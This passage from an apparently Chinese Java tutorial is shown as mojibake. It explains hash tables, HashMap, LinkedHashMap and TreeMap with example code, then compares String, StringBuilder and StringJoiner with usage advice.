<p>ä½†ä½ ä¸ç”¨é€ä¸ªæŠ½å±‰æ‰¾ï¼Œè€Œæ˜¯æœ‰ä¸€ä¸ª<strong>æ™ºèƒ½è®¡ç®—å™¨ï¼ˆå“ˆå¸Œå‡½æ•°ï¼‰</strong> ï¼Œè¾“å…¥æ ‡ç­¾å°±èƒ½<strong>ç›´æ¥ç®—å‡ºæŠ½å±‰ç¼–å·</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">ä¾‹å¦‚ï¼šå­˜â€œå¼ ä¸‰ï¼šç”µè¯138xxxxâ€
<span class="hljs-bullet">1.</span> å¯¹â€œå¼ ä¸‰â€ç”¨å“ˆå¸Œå‡½æ•°è®¡ç®— â†’ å¾—åˆ°ç¼–å·â€œ3â€
<span class="hljs-bullet">2.</span> ç›´æ¥æ‰“å¼€3å·æŠ½å±‰ â†’ å­˜å…¥ç”µè¯
<span class="hljs-bullet">3.</span> å–ç”µè¯æ—¶åŒæ ·è®¡ç®—ç¼–å· â†’ ç¬é—´æ‰¾åˆ°
</code></pre>
<hr/>
<h5 data-id="heading-15"><strong>å…³é”®ç‰¹ç‚¹</strong>ï¼š</h5>
<ol>
<li>
<p><strong>å¿«é€Ÿå­˜å–</strong>ï¼šç†æƒ³æƒ…å†µä¸‹ï¼Œæ— è®ºå­˜å¤šå°‘æ•°æ®ï¼ŒæŸ¥æ‰¾æ—¶é—´å‡ ä¹æ’å®šï¼ˆO(1)ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å“ˆå¸Œç¢°æ’</strong>ï¼š</p>
<p>å¦‚æœâ€œæå››â€ä¹Ÿè®¡ç®—å‡ºç¼–å·3ï¼ˆä¸åŒæ ‡ç­¾ç®—å‡ºç›¸åŒç¼–å·ï¼‰ï¼Œåˆ™ä¸¤ä¸ªç‰©å“ä¼šæ”¾åœ¨<strong>åŒä¸€ä¸ªæŠ½å±‰çš„é“¾è¡¨é‡Œ</strong>ã€‚</p>
</li>
<li>
<p><strong>åŠ¨æ€æ‰©å®¹</strong>ï¼šæŠ½å±‰ä¸å¤Ÿæ—¶ï¼Œè‡ªåŠ¨å¢åŠ æŠ½å±‰å¹¶é‡æ–°åˆ†é…ç‰©å“ã€‚</p>
</li>
</ol>
<hr/>
<h5 data-id="heading-16"><strong>åœ¨HashMapä¸­çš„å®ç°</strong>ï¼š</h5>
<ul>
<li><strong>æ•°ç»„ï¼ˆæŠ½å±‰æŸœï¼‰</strong> ï¼šå­˜æ”¾æ•°æ®ã€‚</li>
<li><strong>é“¾è¡¨/çº¢é»‘æ ‘ï¼ˆæŠ½å±‰å†…çš„æ ¼å­ï¼‰</strong> ï¼šè§£å†³å“ˆå¸Œç¢°æ’ã€‚</li>
<li><strong>å“ˆå¸Œå‡½æ•°ï¼ˆæ™ºèƒ½è®¡ç®—å™¨ï¼‰</strong> ï¼šå°†é”®ï¼ˆå¦‚<code>"å¼ ä¸‰"</code>ï¼‰è½¬æ¢ä¸ºæ•°ç»„ä¸‹æ ‡ã€‚</li>
</ul>
<hr/>
<h5 data-id="heading-17"><strong>ä¸ºä»€ä¹ˆé«˜æ•ˆï¼Ÿ</strong></h5>
<p>æ™®é€šåˆ—è¡¨æ‰¾â€œå¼ ä¸‰â€éœ€è¦éå†æ‰€æœ‰é¡¹ï¼ˆO(n)ï¼‰ï¼Œè€Œå“ˆå¸Œè¡¨é€šè¿‡è®¡ç®—<strong>ç›´æ¥å®šä½</strong>ï¼Œè·³è¿‡äº†å¤§éƒ¨åˆ†æ¯”è¾ƒæ­¥éª¤ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ<code>HashMap</code>åœ¨Javaä¸­å¹¿æ³›ç”¨äºå¿«é€ŸæŸ¥æ‰¾ã€å»é‡å’Œç¼“å­˜ã€‚</p>
<h4 data-id="heading-18">LinkedHashMap</h4>
<ul>
<li>ç”±é”®å†³å®šï¼šæœ‰åºã€ä¸é‡å¤ã€æ— ç´¢å¼•</li>
<li>è¿™é‡Œçš„æœ‰åºæŒ‡çš„æ˜¯ä¿è¯å­˜å‚¨å’Œå–å‡ºçš„å…ƒç´ é¡ºåºä¸€è‡´</li>
<li>åŸç†ï¼šåº•å±‚æ•°æ®ç»“æ„ä¾ç„¶æ˜¯å“ˆå¸Œè¡¨ï¼Œåªæ˜¯æ¯ä¸ªé”®å€¼å¯¹å…ƒç´ åˆé¢å¤–å¤šä¸€ä¸ªåŒé“¾è¡¨çš„æœºåˆ¶è®°å½•å­˜å‚¨çš„é¡ºåº</li>
</ul>
<h4 data-id="heading-19">TreeMap</h4>
<ul>
<li>TreeMapå’ŒTreeSetåº•å±‚åŸç†ä¸€æ ·ï¼Œéƒ½æ˜¯çº¢é»‘æ ‘ç»“æ„</li>
<li>ç”±é”®å†³å®šç‰¹æ€§ï¼šä¸é‡å¤ã€æ— ç´¢å¼•ã€å¯æ’åº</li>
<li>å¯æ’åºï¼šå¯¹é”®è¿›è¡Œæ’åº</li>
<li>å°tipsï¼šé»˜è®¤æŒ‰ç…§é”®çš„ä»å°åˆ°å¤§è¿›è¡Œæ’åºï¼Œä¹Ÿå¯ä»¥è‡ªå·±è§„å®šé”®çš„æ’åºè§„åˆ™</li>
</ul>
<h5 data-id="heading-20">ç¤ºä¾‹1</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> TreeMapDdemo;

<span class="hljs-keyword">import</span> java.util.Comparator;
<span class="hljs-keyword">import</span> java.util.TreeMap;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TreeMapdemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">//åˆ›å»ºé›†åˆå¯¹è±¡</span>
        TreeMap&lt;Integer,String&gt; tm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();
        <span class="hljs-comment">//æ·»åŠ å…ƒç´ </span>
        tm.put(<span class="hljs-number">1</span>,<span class="hljs-string">"å¥¥åˆ©å¥¥"</span>);
        tm.put(<span class="hljs-number">5</span>,<span class="hljs-string">"é›ªç¢§"</span>);
        tm.put(<span class="hljs-number">3</span>,<span class="hljs-string">"å¯ä¹"</span>);
        tm.put(<span class="hljs-number">2</span>,<span class="hljs-string">"ä¹äº‹"</span>);
        tm.put(<span class="hljs-number">4</span>,<span class="hljs-string">"å¥½ä¸½å‹"</span>);
        System.out.println(tm);<span class="hljs-comment">//Integer,DoubleæŒ‰ç…§é”®å‡åºæ’åˆ—ï¼ŒStringæŒ‰ç…§é”®å­—æ¯åœ¨ASCIIç è¡¨ä¸­å¯¹åº”çš„æ•°å­—å‡åºè¿›è¡Œæ’åˆ—</span>
        TreeMap&lt;Integer,String&gt; tm2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Integer&gt;(){
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> {
                <span class="hljs-keyword">return</span> o2-o1;<span class="hljs-comment">//é™åºï¼Œo1:å½“å‰è¦æ·»åŠ çš„å…ƒç´ ï¼Œo2:å½“å‰å·²ç»åœ¨çº¢é»‘æ ‘ä¸­å­˜åœ¨çš„å…ƒç´ </span>
            }
        });
        tm2.put(<span class="hljs-number">1</span>,<span class="hljs-string">"å¥¥åˆ©å¥¥"</span>);
        tm2.put(<span class="hljs-number">5</span>,<span class="hljs-string">"é›ªç¢§"</span>);
        tm2.put(<span class="hljs-number">3</span>,<span class="hljs-string">"å¯ä¹"</span>);
        tm2.put(<span class="hljs-number">2</span>,<span class="hljs-string">"ä¹äº‹"</span>);
        tm2.put(<span class="hljs-number">4</span>,<span class="hljs-string">"å¥½ä¸½å‹"</span>);
        System.out.println(tm2);
    }
}
</code></pre>
<p>è¾“å‡ºç»“æœï¼š</p>
<pre><code class="hljs language-ini" lang="ini">{<span class="hljs-attr">1</span>=å¥¥åˆ©å¥¥, <span class="hljs-number">2</span>=ä¹äº‹, <span class="hljs-number">3</span>=å¯ä¹, <span class="hljs-number">4</span>=å¥½ä¸½å‹, <span class="hljs-number">5</span>=é›ªç¢§}
{<span class="hljs-attr">5</span>=é›ªç¢§, <span class="hljs-number">4</span>=å¥½ä¸½å‹, <span class="hljs-number">3</span>=å¯ä¹, <span class="hljs-number">2</span>=ä¹äº‹, <span class="hljs-number">1</span>=å¥¥åˆ©å¥¥}
</code></pre>
<h5 data-id="heading-21">ç¤ºä¾‹2</h5>
<pre><code class="hljs language-ini" lang="ini">package TreeMapDdemo<span class="hljs-comment">;</span>

import java.util.TreeMap<span class="hljs-comment">;</span>

public class TreeMapdemo2 {
    public static void main(String<span class="hljs-section">[]</span> args) {
        TreeMap&lt;Student,String&gt; <span class="hljs-attr">tm</span>=new TreeMap&lt;&gt;()<span class="hljs-comment">;</span>
        Student <span class="hljs-attr">s1</span>=new Student(<span class="hljs-string">"zhangsan"</span>,<span class="hljs-number">19</span>)<span class="hljs-comment">;</span>
        Student <span class="hljs-attr">s2</span>=new Student(<span class="hljs-string">"lisi"</span>,<span class="hljs-number">18</span>)<span class="hljs-comment">;</span>
        Student <span class="hljs-attr">s3</span>=new Student(<span class="hljs-string">"wangwu"</span>,<span class="hljs-number">20</span>)<span class="hljs-comment">;</span>
        tm.put(s1,"æ±Ÿè‹")<span class="hljs-comment">;</span>
        tm.put(s2,"æµ™æ±Ÿ")<span class="hljs-comment">;</span>
        tm.put(s3,"ä¸Šæµ·")<span class="hljs-comment">;</span>
        System.out.println(tm)<span class="hljs-comment">;</span>
    }
}
</code></pre>

<pre><code class="hljs language-typescript" lang="typescript">package <span class="hljs-title class_">TreeMapDdemo</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparable</span>&lt;<span class="hljs-title class_">Student</span>&gt;{
    <span class="hljs-keyword">private</span> int age;
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;

    <span class="hljs-keyword">public</span> int <span class="hljs-title function_">getAge</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setAge</span>(<span class="hljs-params">int age</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Student</span>(<span class="hljs-title class_">String</span> name, int age) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Student</span>() {
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Student [age="</span> + age + <span class="hljs-string">", name="</span> + name + <span class="hljs-string">"]"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> int <span class="hljs-title function_">compareTo</span>(<span class="hljs-params">Student o</span>) {
        <span class="hljs-comment">//æ¯”è¾ƒè§„åˆ™ï¼šæŒ‰ç…§å­¦ç”Ÿå¹´é¾„å‡åºæ’åˆ—ï¼Œå¹´é¾„ä¸€æ ·æŒ‰ç…§å§“åçš„å­—æ¯æ’åˆ—ï¼ŒåŒå§“åå¹´é¾„è§†ä¸ºåŒä¸€ä¸ªäºº</span>
        <span class="hljs-comment">//thisï¼šè¡¨ç¤ºå½“å‰è¦æ·»åŠ çš„å…ƒç´ </span>
        <span class="hljs-comment">//oï¼šè¡¨ç¤ºå·²ç»åœ¨çº¢é»‘æ ‘ä¸­å­˜åœ¨çš„å…ƒç´ </span>
        <span class="hljs-comment">//è¿”å›å€¼ï¼šè´Ÿæ•°è¡¨ç¤ºå½“å‰è¦æ·»åŠ çš„å…ƒç´ æ˜¯å°çš„ï¼Œå­˜å·¦è¾¹ï¼Œæ•´æ•°åä¹‹ï¼Œ0è¡¨ç¤ºå·²ç»å­˜åœ¨ï¼Œèˆå¼ƒ</span>
        int i=<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAge</span>()-o.<span class="hljs-title function_">getAge</span>();
        i=i==<span class="hljs-number">0</span>?<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">compareTo</span>(o.<span class="hljs-title function_">getName</span>()):i;
        <span class="hljs-keyword">return</span> i;
    }
}
</code></pre>
<h5 data-id="heading-22">ç¤ºä¾‹3</h5>
<pre><code class="hljs language-arduino" lang="arduino">package TreeMapDdemo;

<span class="hljs-keyword">import</span> java.util.TreeMap;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TreaaMapdemo3</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-comment">//ç»Ÿè®¡å­—ç¬¦ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°</span>
        <span class="hljs-comment">//åˆ©ç”¨mapé›†åˆè¿›è¡Œç»Ÿè®¡ï¼ŒHashMApã€TreeMapï¼Œé”®è¡¨ç¤ºè¦ç»Ÿè®¡çš„å†…å®¹ï¼Œå€¼è¡¨ç¤ºæ¬¡æ•°</span>
        <span class="hljs-comment">//æœªè¦æ±‚å¯¹ç»“æœæ’åºï¼Œé»˜è®¤ä½¿ç”¨HashMapï¼Œè¦æ±‚æ’åºä½¿ç”¨TreeMap</span>
        <span class="hljs-type">String</span> str=<span class="hljs-string">"aabdcbcbbcaabb"</span>;
        TreeMap&lt;Character,Integer&gt; map=<span class="hljs-keyword">new</span> TreeMap&lt;&gt;();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; str.<span class="hljs-built_in">length</span>(); i++) {
            <span class="hljs-type">char</span> ch=str.<span class="hljs-built_in">charAt</span>(i);
            <span class="hljs-keyword">if</span>(map.<span class="hljs-built_in">containsKey</span>(ch)){
                <span class="hljs-type">int</span> count=map.<span class="hljs-built_in">get</span>(ch);
                count++;
                map.<span class="hljs-built_in">put</span>(ch,count);
            }
            <span class="hljs-keyword">else</span>{
                map.<span class="hljs-built_in">put</span>(ch,<span class="hljs-number">1</span>);
            }
        }
        <span class="hljs-comment">//éå†é›†åˆï¼Œæ›´æ”¹æ ¼å¼</span>
        StringBuilder sb=<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringBuilder</span>();
        map.forEach((k,v)-&gt; sb.<span class="hljs-built_in">append</span>(k).<span class="hljs-built_in">append</span>(<span class="hljs-string">"("</span>).<span class="hljs-built_in">append</span>(v).<span class="hljs-built_in">append</span>(<span class="hljs-string">")"</span>));
        System.out.<span class="hljs-built_in">println</span>(sb.<span class="hljs-built_in">toString</span>());
    }
}
</code></pre>
<p>è¾“å‡ºç»“æœï¼ša(4)b(6)c(3)d(1)</p>
<h4 data-id="heading-23">çŸ¥è¯†è¡ç”Ÿ</h4>
<h4 data-id="heading-24">StringBuilderã€StringJoinerä¸Stringçš„åŒºåˆ«ä¸è”ç³»</h4>
<h5 data-id="heading-25">ä¸€ã€Stringï¼ˆä¸å¯å˜å­—ç¬¦ä¸²ï¼‰</h5>
<p><strong>æ ¸å¿ƒç‰¹æ€§ï¼šå­—ç¬¦ä¸²å¸¸é‡ï¼Œä¸€æ—¦åˆ›å»ºå†…å®¹ä¸å¯æ”¹å˜</strong></p>
<pre><code class="hljs language-ini" lang="ini">String <span class="hljs-attr">s1</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">;</span>
<span class="hljs-attr">s1</span> = s1 + <span class="hljs-string">" world"</span><span class="hljs-comment">;  // çœ‹ä¼¼ä¿®æ”¹ï¼Œå®é™…åˆ›å»ºäº†æ–°å¯¹è±¡</span>
</code></pre>
<h6 data-id="heading-26">ç‰¹ç‚¹ï¼š</h6>
<ol>
<li><strong>ä¸å¯å˜æ€§</strong>ï¼šæ¯æ¬¡"ä¿®æ”¹"éƒ½ä¼šåˆ›å»ºæ–°å¯¹è±¡</li>
<li><strong>å­˜å‚¨ä½ç½®</strong>ï¼šå­—ç¬¦ä¸²å¸¸é‡æ± ï¼ˆäº«å…ƒæ¨¡å¼ï¼‰</li>
<li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼šå› ä¸ºä¸å¯å˜ï¼Œå¤©ç„¶çº¿ç¨‹å®‰å…¨</li>
<li><strong>æ•ˆç‡é—®é¢˜</strong>ï¼šé¢‘ç¹æ‹¼æ¥æ—¶æ€§èƒ½å·®ï¼Œäº§ç”Ÿå¤§é‡åƒåœ¾å¯¹è±¡</li>
</ol>
<hr/>
<h5 data-id="heading-27">äºŒã€StringBuilderï¼ˆå¯å˜å­—ç¬¦ä¸²ï¼‰</h5>
<h6 data-id="heading-28">åŸºæœ¬ç‰¹æ€§ï¼š</h6>
<pre><code class="hljs language-ini" lang="ini">StringBuilder <span class="hljs-attr">sb</span> = new StringBuilder()<span class="hljs-comment">;</span>
sb.append("Hello")<span class="hljs-comment">;</span>
sb.append(" ")<span class="hljs-comment">;</span>
sb.append("World")<span class="hljs-comment">;</span>
String <span class="hljs-attr">result</span> = sb.toString()<span class="hljs-comment">;  // ä¸€æ¬¡æ€§è½¬æ¢ä¸ºString</span>
</code></pre>
<h5 data-id="heading-29">æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼š</h5>
<ol>
<li>
<p><strong>å¯å˜æ€§</strong>ï¼šå†…éƒ¨ç»´æŠ¤å¯å˜çš„charæ•°ç»„ï¼Œç›´æ¥ä¿®æ”¹å†…å®¹</p>
</li>
<li>
<p><strong>éçº¿ç¨‹å®‰å…¨</strong>ï¼šä¸æä¾›åŒæ­¥æœºåˆ¶ï¼Œæ€§èƒ½æ›´é«˜</p>
</li>
<li>
<p><strong>åˆå§‹å®¹é‡</strong>ï¼šé»˜è®¤16å­—ç¬¦ï¼Œå¯è‡ªåŠ¨æ‰©å®¹</p>
</li>
<li>
<p><strong>å¸¸ç”¨æ–¹æ³•</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">append</span>()    <span class="hljs-comment">// è¿½åŠ å†…å®¹</span>
<span class="hljs-built_in">insert</span>()    <span class="hljs-comment">// æ’å…¥å†…å®¹</span>
<span class="hljs-built_in">delete</span>()    <span class="hljs-comment">// åˆ é™¤æŒ‡å®šèŒƒå›´</span>
<span class="hljs-built_in">reverse</span>()   <span class="hljs-comment">// åè½¬å­—ç¬¦ä¸²</span>
<span class="hljs-built_in">toString</span>()  <span class="hljs-comment">// è½¬æ¢ä¸ºString</span>
</code></pre>
</li>
</ol>
<h6 data-id="heading-30">ä½¿ç”¨åœºæ™¯ï¼š</h6>
<ul>
<li><strong>å¾ªç¯æ‹¼æ¥å­—ç¬¦ä¸²</strong>ï¼ˆå›¾ä¸­ç”¨æ³•ï¼‰</li>
<li><strong>éœ€è¦å¤§é‡å­—ç¬¦ä¸²æ“ä½œçš„åœºæ™¯</strong></li>
<li><strong>å•çº¿ç¨‹ç¯å¢ƒä¸‹</strong></li>
</ul>
<h6 data-id="heading-31">æ€§èƒ½ä¼˜åŠ¿ç¤ºä¾‹ï¼š</h6>
<pre><code class="hljs language-ini" lang="ini">// é”™è¯¯ï¼šäº§ç”Ÿå¤§é‡ä¸´æ—¶å¯¹è±¡
String <span class="hljs-attr">result</span> = <span class="hljs-string">""</span><span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 1000; i++) {</span>
    result += i<span class="hljs-comment">;  // æ¯æ¬¡å¾ªç¯åˆ›å»ºæ–°Stringå¯¹è±¡</span>
}

// æ­£ç¡®ï¼šåªåˆ›å»ºä¸€ä¸ªStringBuilderå¯¹è±¡
StringBuilder <span class="hljs-attr">sb</span> = new StringBuilder()<span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 1000; i++) {</span>
    sb.append(i)<span class="hljs-comment">;  // ä¿®æ”¹åŒä¸€ä¸ªå¯¹è±¡</span>
}
String <span class="hljs-attr">result</span> = sb.toString()<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h5 data-id="heading-32">ä¸‰ã€StringJoinerï¼ˆå­—ç¬¦ä¸²è¿æ¥å™¨ï¼‰</h5>
<h6 data-id="heading-33">åŸºæœ¬ç‰¹æ€§ï¼ˆJava 8+ï¼‰ï¼š</h6>
<pre><code class="hljs language-csharp" lang="csharp">StringJoiner sj = <span class="hljs-keyword">new</span> StringJoiner(<span class="hljs-string">", "</span>, <span class="hljs-string">"["</span>, <span class="hljs-string">"]"</span>);
sj.<span class="hljs-keyword">add</span>(<span class="hljs-string">"A"</span>).<span class="hljs-keyword">add</span>(<span class="hljs-string">"B"</span>).<span class="hljs-keyword">add</span>(<span class="hljs-string">"C"</span>);
String result = sj.toString();  <span class="hljs-comment">// ç»“æœï¼š[A, B, C]</span>
</code></pre>
<h6 data-id="heading-34">æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼š</h6>
<ol>
<li>
<p><strong>ä¸“é—¨ç”¨äºè¿æ¥å¤šä¸ªå­—ç¬¦ä¸²</strong></p>
</li>
<li>
<p><strong>æ”¯æŒåˆ†éš”ç¬¦ã€å‰ç¼€ã€åç¼€</strong></p>
</li>
<li>
<p><strong>åº•å±‚å®ç°</strong>ï¼šåŸºäºStringBuilder</p>
</li>
<li>
<p><strong>å¸¸ç”¨æ–¹æ³•</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">add</span>()      <span class="hljs-comment">// æ·»åŠ å…ƒç´ </span>
<span class="hljs-built_in">merge</span>()    <span class="hljs-comment">// åˆå¹¶å¦ä¸€ä¸ªStringJoiner</span>
<span class="hljs-built_in">length</span>()   <span class="hljs-comment">// å½“å‰é•¿åº¦</span>
<span class="hljs-built_in">toString</span>() <span class="hljs-comment">// è½¬æ¢ä¸ºString</span>
</code></pre>
</li>
</ol>
<h6 data-id="heading-35">ä½¿ç”¨åœºæ™¯ï¼š</h6>
<ol>
<li><strong>é›†åˆè½¬å­—ç¬¦ä¸²</strong>ï¼ˆå®Œç¾æ›¿ä»£æ‰‹åŠ¨æ‹¼æ¥ï¼‰</li>
<li><strong>æ ¼å¼åŒ–è¾“å‡º</strong></li>
<li><strong>CSVæ–‡ä»¶ç”Ÿæˆ</strong></li>
</ol>
<h5 data-id="heading-36">ç¤ºä¾‹å¯¹æ¯”ï¼š</h5>
<pre><code class="hljs language-ini" lang="ini">// ä¼ ç»Ÿæ–¹å¼ï¼ˆç¹çï¼‰
StringBuilder <span class="hljs-attr">sb</span> = new StringBuilder(<span class="hljs-string">"["</span>)<span class="hljs-comment">;</span>
for (String s : list) {
    if (sb.length() &gt; 1) sb.append(", ")<span class="hljs-comment">;</span>
    sb.append(s)<span class="hljs-comment">;</span>
}
sb.append("]")<span class="hljs-comment">;</span>

// StringJoineræ–¹å¼ï¼ˆç®€æ´ï¼‰
StringJoiner <span class="hljs-attr">sj</span> = new StringJoiner(<span class="hljs-string">", "</span>, <span class="hljs-string">"["</span>, <span class="hljs-string">"]"</span>)<span class="hljs-comment">;</span>
list.forEach(sj::add)<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h5 data-id="heading-37">å››ã€ä¸‰è€…å…³ç³»ä¸é€‰æ‹©ç­–ç•¥</h5>
<h6 data-id="heading-38">å…³ç³»å›¾ï¼š</h6>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚               Stringï¼ˆä¸å¯å˜ï¼‰            â”‚
â”‚           <span class="hljs-built_in">toString</span>()æ–¹æ³•è¿”å›             â”‚
â””â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      â”‚                    â”‚
      â†“                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ StringBuilder   â”‚â†â”€â”€â”‚  StringJoiner       â”‚
â”‚ ï¼ˆå¯å˜ï¼Œé«˜æ•ˆæ‹¼æ¥ï¼‰ â”‚   â”‚ ï¼ˆä¸“é—¨ç”¨äºè¿æ¥ï¼Œå°è£…äº†â”‚
â”‚                 â”‚   â”‚  StringBuilderåŠŸèƒ½ï¼‰â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h6 data-id="heading-39">é€‰æ‹©ç­–ç•¥ï¼š</h6>



































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èå·¥å…·</th><th>ç†ç”±</th></tr></thead><tbody><tr><td>å›ºå®šçš„å­—ç¬¦ä¸²å¸¸é‡</td><td>String</td><td>ä¸å¯å˜ï¼Œçº¿ç¨‹å®‰å…¨ï¼Œå¯ç¼“å­˜</td></tr><tr><td>å•çº¿ç¨‹å¤§é‡å­—ç¬¦ä¸²æ‹¼æ¥</td><td>StringBuilder</td><td>æ€§èƒ½æœ€ä¼˜ï¼Œé¿å…å¯¹è±¡åˆ›å»º</td></tr><tr><td>å¤šçº¿ç¨‹å­—ç¬¦ä¸²æ“ä½œ</td><td>StringBuffer</td><td>çº¿ç¨‹å®‰å…¨ç‰ˆæœ¬</td></tr><tr><td>é›†åˆè½¬æŒ‡å®šæ ¼å¼å­—ç¬¦ä¸²</td><td>StringJoiner</td><td>è¯­æ³•ç®€æ´ï¼ŒåŠŸèƒ½ä¸“ä¸€</td></tr><tr><td>ç®€å•è¿æ¥å°‘é‡å­—ç¬¦ä¸²</td><td>Stringçš„ <code>+</code></td><td>ä»£ç ç®€æ´ï¼Œç¼–è¯‘å™¨ä¼˜åŒ–</td></tr></tbody></table>
<hr/>
<h5 data-id="heading-40">äº”ã€æœ€ä½³å®è·µæ€»ç»“</h5>
<h6 data-id="heading-41">1. <strong>æ€§èƒ½ä¼˜å…ˆåŸåˆ™</strong></h6>
<pre><code class="hljs language-ini" lang="ini">// é¿å…
String <span class="hljs-attr">s</span> = <span class="hljs-string">""</span><span class="hljs-comment">;</span>
for (Data data : list) {
    s += data.toString()<span class="hljs-comment">;  // æ€§èƒ½æ€æ‰‹ï¼</span>
}

// é‡‡ç”¨
StringBuilder <span class="hljs-attr">sb</span> = new StringBuilder()<span class="hljs-comment">;</span>
for (Data data : list) {
    sb.append(data.toString())<span class="hljs-comment">;</span>
}
String <span class="hljs-attr">result</span> = sb.toString()<span class="hljs-comment">;</span>
</code></pre>
<h6 data-id="heading-42">2. <strong>æ ¼å¼åŒ–ä¼˜å…ˆåŸåˆ™</strong></h6>
<pre><code class="hljs language-ini" lang="ini">// é¿å…æ‰‹åŠ¨æ‹¼æ¥åˆ†éš”ç¬¦
StringBuilder <span class="hljs-attr">sb</span> = new StringBuilder()<span class="hljs-comment">;</span>
boolean <span class="hljs-attr">first</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
for (String item : items) {
    if (!first) sb.append(", ")<span class="hljs-comment">;</span>
    sb.append(item)<span class="hljs-comment">;</span>
    <span class="hljs-attr">first</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
}

// ä½¿ç”¨StringJoiner
StringJoiner <span class="hljs-attr">sj</span> = new StringJoiner(<span class="hljs-string">", "</span>)<span class="hljs-comment">;</span>
items.forEach(sj::add)<span class="hljs-comment">;</span>
</code></pre>
<h6 data-id="heading-43">3. <strong>é“¾å¼è°ƒç”¨ä¸æµç•…API</strong></h6>
<pre><code class="hljs language-sql" lang="sql">String <span class="hljs-keyword">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> StringJoiner("\n")
    .<span class="hljs-keyword">add</span>("å§“å: " <span class="hljs-operator">+</span> name)
    .<span class="hljs-keyword">add</span>("å¹´é¾„: " <span class="hljs-operator">+</span> age)
    .<span class="hljs-keyword">add</span>("åœ°å€: " <span class="hljs-operator">+</span> address)
    .toString();
</code></pre>
